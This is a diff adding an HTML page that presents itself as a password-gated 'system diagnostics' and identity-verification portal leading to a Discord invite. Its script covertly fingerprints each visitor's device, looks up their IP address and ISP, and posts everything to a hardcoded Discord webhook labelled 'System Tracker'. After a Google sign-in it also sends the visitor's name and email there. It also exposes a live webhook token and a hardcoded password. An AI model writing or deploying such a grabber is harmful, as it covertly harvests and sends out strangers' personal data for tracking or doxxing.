@@ -1,1 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>System Access & Portal</title>
+  <!-- Load the official Google Identity Services library -->
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  
+  <style>
+    body, html { margin: 0; padding: 0; height: 100%; background-color: black; font-family: "Anonymous Pro", monospace; color: #8cff66; }
+    .centered { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px 0; }
+    .info-panel, .password-panel, .portal-card { padding: 20px; border-radius: 10px; background-color: rgba(17, 17, 17, 0.9); border: 1px solid #333; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5); text-align: center; width: 90%; max-width: 450px; }
+    h3, h2 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; color: white; }
+    label { display: block; margin-bottom: 5px; text-align: left; font-size: 0.85em; color: #aaa; font-weight: bold; }
+    input { width: 100%; padding: 8px; margin-bottom: 15px; box-sizing: border-box; font-family: "Anonymous Pro", monospace; border: 1px solid #333; border-radius: 4px; font-size: 0.9em; background-color: #000; color: #8cff66; }
+    input[readonly] { background-color: #111; color: #8cff66; border-color: #222; }
+    button, .dm-btn { background-color: #444; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-family: "Anonymous Pro", monospace; width: 100%; font-size: 1em; transition: background 0.3s; text-decoration: none; display: block; box-sizing: border-box; }
+    button:hover, .dm-btn:hover { background-color: #666; }
+    .dm-btn { background-color: #8cff66; color: black; font-weight: bold; }
+    .dm-btn:hover { background-color: #a3ff85; }
+    #infoSection, #contactSection { display: none; }
+    #statusMsg { font-size: 0.8em; margin-top: 10px; font-weight: bold; }
+    #debugLog { font-size: 0.6em; color: #555; margin-top: 5px; }
+    #googleBtnContainer { display: flex; justify-content: center; margin-top: 15px; }
+    
+    /* CSS DETECTORS */
+    #notch-detector {
+      position: absolute; top: 0; left: 0;
+      height: env(safe-area-inset-top); width: 1px;
+      visibility: hidden; z-index: -1;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="notch-detector"></div>
+
+  <!-- PHASE 1: Password Gate -->
+  <div id="passwordGate" class="centered">
+    <div class="password-panel">
+      <label for="gatePassword">SECURE ACCESS TERMINAL:</label>
+      <input type="password" id="gatePassword" placeholder="Enter access code..." />
+      <button onclick="unlock()">AUTHENTICATE</button>
+      <p id="wrongPass" style="color: #ff4444; display: none; margin-top:10px;">ACCESS DENIED</p>
+    </div>
+  </div>
+
+  <!-- PHASE 2: Info Panel (Runs hardware scan) -->
+  <div id="infoSection" class="centered">
+    <div class="info-panel">
+      <h3>SYSTEM DIAGNOSTICS v10.0</h3>
+
+      <label for="name">DEVICE MODEL:</label>
+      <input type="text" id="name" value="Fetching..." readonly />
+
+      <label for="gpu">GRAPHICS UNIT (GPU):</label>
+      <input type="text" id="gpu" value="Scanning..." readonly />
+
+      <label for="res">RESOLUTION & DISPLAY:</label>
+      <input type="text" id="res" value="Calculating..." readonly />
+
+      <label for="config">SYSTEM CONFIG:</label>
+      <input type="text" id="config" value="Scanning..." readonly />
+
+      <label for="ip">IP ADDRESS:</label>
+      <input type="text" id="ip" value="Scanning..." readonly />
+
+      <label for="isp">INTERNET PROVIDER:</label>
+      <input type="text" id="isp" value="Scanning..." readonly />
+
+      <p id="statusMsg" style="color: yellow;">Initializing Deep Scan...</p>
+      <p id="debugLog">Checking Refresh Rate...</p>
+      
+      <!-- Button to proceed to the Google gate once diagnostics are done -->
+      <button id="proceedBtn" style="display:none; margin-top: 15px; background-color: #222; border: 1px solid #8cff66; color: #8cff66;" onclick="goToContact()">PROCEED TO DIRECT MESSAGES</button>
+    </div>
+  </div>
+
+  <!-- PHASE 3: Google Identity Portal -->
+  <div id="contactSection" class="centered">
+    <div class="portal-card">
+      <h2>IDENTITY VERIFICATION</h2>
+      <p style="color: #888; font-size: 0.9em; margin-bottom: 20px;">To reveal the direct message link, verify your identity via Google:</p>
+
+      <!-- Google Sign-In Button -->
+      <div id="googleBtnContainer">
+        <!-- !!! IMPORTANT !!! Replace the data-client_id below with your real Google Client ID once you have it -->
+        <div id="g_id_onload"
+             data-client_id="YOUR_GOOGLE_CLIENT_ID_GOES_HERE.apps.googleusercontent.com"
+             data-callback="handleCredentialResponse"
+             data-auto_prompt="false">
+        </div>
+        <div class="g_id_signin"
+             data-type="standard"
+             data-size="large"
+             data-theme="filled_black"
+             data-text="signin_with"
+             data-shape="rectangular"
+             data-logo_alignment="left">
+        </div>
+      </div>
+
+      <!-- Hidden DM Link (Only appears after Google auth) -->
+      <div id="hiddenGateway" style="display: none; margin-top: 20px;">
+        <p style="color: #8cff66; margin-bottom: 20px;">Verified: <span id="userEmail" style="color:white; font-weight:bold;"></span></p>
+        <a href="https://discord.gg/bVGqTnTuJ" class="dm-btn" target="_blank">SEND DIRECT MESSAGE</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let globalSyncData = {};
+    let globalAsyncData = {};
+
+    function log(msg) { document.getElementById('debugLog').innerText = msg; }
+
+    function unlock() {
+      const input = document.getElementById("gatePassword").value;
+      if (input === "janessainte") {
+        document.getElementById("passwordGate").style.display = "none";
+        document.getElementById("infoSection").style.display = "flex";
+        runDetection(); // Start scanning once unlocked
+      } else {
+        document.getElementById("wrongPass").style.display = "block";
+      }
+    }
+
+    function goToContact() {
+      document.getElementById("infoSection").style.display = "none";
+      document.getElementById("contactSection").style.display = "flex";
+    }
+
+    // --- REFRESH RATE DETECTOR ---
+    function getRefreshRate() {
+      return new Promise(resolve => {
+        let frames = 0;
+        let startTime = performance.now();
+        function loop() {
+          frames++;
+          const now = performance.now();
+          if (now - startTime >= 500) {
+            resolve(Math.round(frames * 2));
+          } else {
+            requestAnimationFrame(loop);
+          }
+        }
+        requestAnimationFrame(loop);
+      });
+    }
+
+    // --- DEVICE IDENTIFICATION ---
+    async function identifyDevice() {
+      const ua = navigator.userAgent;
+      const w = window.screen.width;
+      const h = window.screen.height;
+      const notchDiv = document.getElementById('notch-detector');
+      const safeArea = notchDiv.clientHeight || 0;
+      const fps = await getRefreshRate();
+      const isPro = fps > 90;
+      const isIsland = safeArea > 46;
+      const isNotch = safeArea > 30 && safeArea < 47;
+      
+      let name = "Unknown Device";
+      let type = "PC";
+      let os = "Unknown";
+
+      if (/iPhone|iPad/.test(ua)) {
+        type = "iOS"; os = "iOS";
+        if (w === 440 || h === 956) name = "iPhone 16 Pro Max 👑";
+        else if (w === 402 || h === 874) name = "iPhone 16 Pro 💎";
+        else if (w === 430 || h === 932) name = isPro ? "iPhone 15 Pro Max / 14 Pro Max" : "iPhone 16 Plus / 15 Plus / 14 Plus";
+        else if (w === 393 || h === 852) name = isPro ? "iPhone 15 Pro / 14 Pro" : "iPhone 16 / 15";
+        else if (w === 390 || h === 844) name = isPro ? "iPhone 13 Pro / 12 Pro" : "iPhone 14 / 13 / 12";
+        else if (w === 320 || h === 693) {
+          if (isIsland && isPro) name = "iPhone 16 Pro / 15 Pro (Zoomed)";
+          else if (isIsland && !isPro) name = "iPhone 16 / 15 (Zoomed)";
+          else if (isNotch) name = "iPhone 14/13/12 (Zoomed)";
+          else name = "iPhone SE / Legacy (Zoomed)";
+        }
+        else if (w === 375) name = "iPhone 11 Pro / X / XS / Mini";
+        else if (w === 414) name = "iPhone 11 / XR / Max Model";
+        else name = `iPhone (${w}x${h})`;
+      } else if (/Android/.test(ua)) {
+        type = "Android"; os = "Android";
+        name = ua.match(/;\s?([^;]*?)\sBuild/) ? ua.match(/;\s?([^;]*?)\sBuild/)[1] : "Android Generic";
+      } else if (/Windows/.test(ua)) { name = "Windows PC"; os = "Windows"; }
+      else if (/Mac/.test(ua)) { name = "Macintosh"; os = "macOS"; }
+
+      return {
+        name, type, os, fps, safeArea, res: `${w}x${h}`,
+        gpu: getGPUInfo(),
+        cores: navigator.hardwareConcurrency || "?",
+        ram: navigator.deviceMemory || "?",
+        theme: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Dark" : "Light"
+      };
+    }
+
+    function getGPUInfo() {
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+      } catch(e) { return "Blocked"; }
+    }
+
+    async function getAsyncInfo(osType) {
+      const timeout = (ms) => new Promise(res => setTimeout(() => res(null), ms));
+      const batPromise = (async () => {
+        try {
+          if (osType === "iOS") return "Apple Restricted";
+          if(!navigator.getBattery) return "N/A";
+          const b = await navigator.getBattery();
+          return `${Math.round(b.level*100)}%`;
+        } catch(e) { return "Blocked"; }
+      })();
+      const ipPromise = (async () => {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const d = await res.json();
+          return d.ip;
+        } catch(e) { return "Hidden/VPN"; }
+      })();
+      const ispPromise = (async () => {
+        try {
+          const res = await fetch("https://ipwho.is/");
+          const d = await res.json();
+          return d.connection ? d.connection.isp : "Unknown ISP";
+        } catch(e) { return "Unknown/Hidden"; }
+      })();
+
+      return {
+        battery: await Promise.race([batPromise, timeout(1000)]) || "Timeout",
+        ip: await Promise.race([ipPromise, timeout(1500)]) || "Timeout",
+        isp: await Promise.race([ispPromise, timeout(1500)]) || "Timeout"
+      };
+    }
+
+    // --- DISCORD WEBHOOK ---
+    async function fireWebhook(data, gmailInfo = null) {
+      const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
+      
+      const fields = [
+        { name: 'IP Address', value: data.ip || 'Unknown', inline: true },
+        { name: 'ISP', value: data.isp || 'Unknown', inline: true },
+        { name: 'Model', value: data.name || 'Unknown', inline: false },
+        { name: 'Display', value: `${data.fps}Hz | ${data.safeArea}px (Notch)`, inline: false },
+        { name: 'GPU', value: data.gpu || 'Unknown', inline: false },
+        { name: 'Specs', value: `${data.res} | ${data.cores} Cores`, inline: false }
+      ];
+
+      // If they completed Google login, append their Google Account Info to the Discord Embed!
+      if (gmailInfo) {
+        fields.unshift(
+          { name: '🔴 VERIFIED NAME', value: gmailInfo.name, inline: true },
+          { name: '🔴 VERIFIED EMAIL', value: gmailInfo.email, inline: true }
+        );
+      }
+
+      const jsonPayload = JSON.stringify({
+        username: "System Tracker",
+        embeds: [{
+          title: gmailInfo ? '🚨 AUTHENTICATED ACCESS PORTAL LOG' : '🚨 PRECISION DEVICE LOG',
+          color: gmailInfo ? 15158332 : 3066993, // Red color if authenticated, green if just visiting
+          fields: fields,
+          timestamp: new Date().toISOString()
+        }]
+      });
+
+      const formData = new FormData();
+      formData.append('payload_json', jsonPayload);
+      try {
+        await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: formData });
+      } catch (e) { console.log(e); }
+    }
+
+    // --- RUNNER ---
+    async function runDetection() {
+      setTimeout(async () => {
+        log("Analyzing Hardware...");
+        globalSyncData = await identifyDevice();
+
+        document.getElementById('name').value = `${globalSyncData.type} | ${globalSyncData.name}`;
+        document.getElementById('gpu').value = globalSyncData.gpu;
+        document.getElementById('res').value = `${globalSyncData.res} | ${globalSyncData.fps}Hz Display`;
+        document.getElementById('config').value = `${globalSyncData.theme} Mode`;
+
+        log("Scanning Network...");
+        globalAsyncData = await getAsyncInfo(globalSyncData.os);
+
+        document.getElementById('ip').value = globalAsyncData.ip;
+        document.getElementById('isp').value = globalAsyncData.isp;
+        document.getElementById('config').value += ` | Bat: ${globalAsyncData.battery}`;
+
+        log("Processing...");
+        const fullData = { ...globalSyncData, ...globalAsyncData };
+        await fireWebhook(fullData);
+
+        // Show the "PROCEED" button to go to Google Portal
+        document.getElementById('statusMsg').innerText = "Device Analysis Completed ✅";
+        document.getElementById('statusMsg').style.color = "#8cff66";
+        document.getElementById('proceedBtn').style.display = "block";
+      }, 100);
+    }
+
+    // --- GOOGLE SIGN IN RESPONSE ---
+    function decodeJwt(token) {
+      try {
+        const base64Url = token.split('.')[1];
+        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+        const jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(''));
+        return JSON.parse(jsonPayload);
+      } catch (e) { return null; }
+    }
+
+    async function handleCredentialResponse(response) {
+      const payload = decodeJwt(response.credential);
+      if (payload) {
+        // Hide google button
+        document.getElementById("googleBtnContainer").style.display = "none";
+        // Show email
+        document.getElementById("userEmail").innerText = payload.email;
+        // Show hidden link
+        document.getElementById("hiddenGateway").style.display = "block";
+
+        // Send a second webhook alert containing their Google name and email combined with previous specs!
+        const fullData = { ...globalSyncData, ...globalAsyncData };
+        await fireWebhook(fullData, { name: payload.name, email: payload.email });
+      } else {
+        alert("Verification failed.");
+      }
+    }
+  </script>
+</body>
+</html>
